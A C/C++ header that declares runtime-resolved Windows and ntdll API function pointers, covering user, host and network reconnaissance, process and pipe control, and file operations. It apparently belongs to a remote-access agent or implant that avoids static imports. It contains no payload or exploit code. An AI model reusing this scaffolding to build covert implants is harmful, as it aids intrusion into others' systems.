#pragma once

#include <windows.h>
#include <iphlpapi.h>
#include <psapi.h>
#include "ntdll.h"

#define TEB NtCurrentTeb()
#define DECL_API(x) decltype(x) * x

typedef int (*vsnprintf_t)(char* str, size_t size, const char* format, va_list args);

extern void* __cdecl memset(void*, int, size_t);
extern void* __cdecl memcpy(void*, const void*, size_t);

struct WINAPIFUNC
{
	// kernel32
	DECL_API(CopyFileA);
	DECL_API(CreateDirectoryA);
	DECL_API(CreateFileA);
	DECL_API(CreatePipe);
	DECL_API(CreateProcessA);
	DECL_API(DeleteFileA);
	DECL_API(FindClose);
	DECL_API(FindFirstFileA);
	DECL_API(FindNextFileA);
	DECL_API(FreeLibrary);
	DECL_API(GetACP);
	DECL_API(GetComputerNameExA);
	DECL_API(GetCurrentDirectoryA);
	DECL_API(GetDriveTypeA);
	DECL_API(GetExitCodeProcess);
	DECL_API(GetExitCodeThread);
	DECL_API(GetFileSize);
	DECL_API(GetFileAttributesA);
	DECL_API(GetFullPathNameA);
	DECL_API(GetLastError);
	DECL_API(GetLogicalDrives);
	DECL_API(GetOEMCP);
	DECL_API(GetModuleBaseNameA);
	DECL_API(GetModuleHandleA);
	DECL_API(GetProcAddress);
	DECL_API(GetTickCount);
	//DECL_API(GetTokenInformation);
	DECL_API(GetTimeZoneInformation);
	DECL_API(HeapAlloc);
	DECL_API(HeapCreate);
	DECL_API(HeapDestroy);
	DECL_API(HeapReAlloc);
	DECL_API(HeapFree);
	DECL_API(IsWow64Process);
	DECL_API(LoadLibraryA);
	DECL_API(LocalAlloc);
	DECL_API(LocalFree);
	DECL_API(LocalReAlloc);
	DECL_API(MoveFileA);
	DECL_API(MultiByteToWideChar);
	DECL_API(PeekNamedPipe);
	DECL_API(ReadFile);
	DECL_API(RemoveDirectoryA);
	DECL_API(RtlCaptureContext);
	DECL_API(SetCurrentDirectoryA);
	DECL_API(SetNamedPipeHandleState);
	DECL_API(Sleep);
	DECL_API(VirtualAlloc);
	DECL_API(VirtualFree);
	DECL_API(WideCharToMultiByte);
	DECL_API(WriteFile);
	
	// iphlpapi
	DECL_API(GetAdaptersInfo);

	// advapi32
	DECL_API(GetTokenInformation);
	DECL_API(GetUserNameA);
	DECL_API(LookupAccountSidA);

	// msvcrt
	vsnprintf_t vsnprintf;
};

struct NTAPIFUNC
{
	DECL_API(NtClose);
	DECL_API(NtContinue);
	DECL_API(NtFreeVirtualMemory);
	DECL_API(NtQueryInformationProcess);
	DECL_API(NtQuerySystemInformation);
	DECL_API(NtOpenProcess);
	DECL_API(NtOpenProcessToken);
	DECL_API(NtTerminateThread);
	DECL_API(NtTerminateProcess);
	DECL_API(RtlGetVersion);
	DECL_API(RtlExitUserThread);
	DECL_API(RtlExitUserProcess);
	DECL_API(RtlIpv4StringToAddressA);
	DECL_API(RtlRandomEx);
	DECL_API(RtlNtStatusToDosError);
};

extern WINAPIFUNC* ApiWin;
extern NTAPIFUNC*  ApiNt;

BOOL ApiLoad();
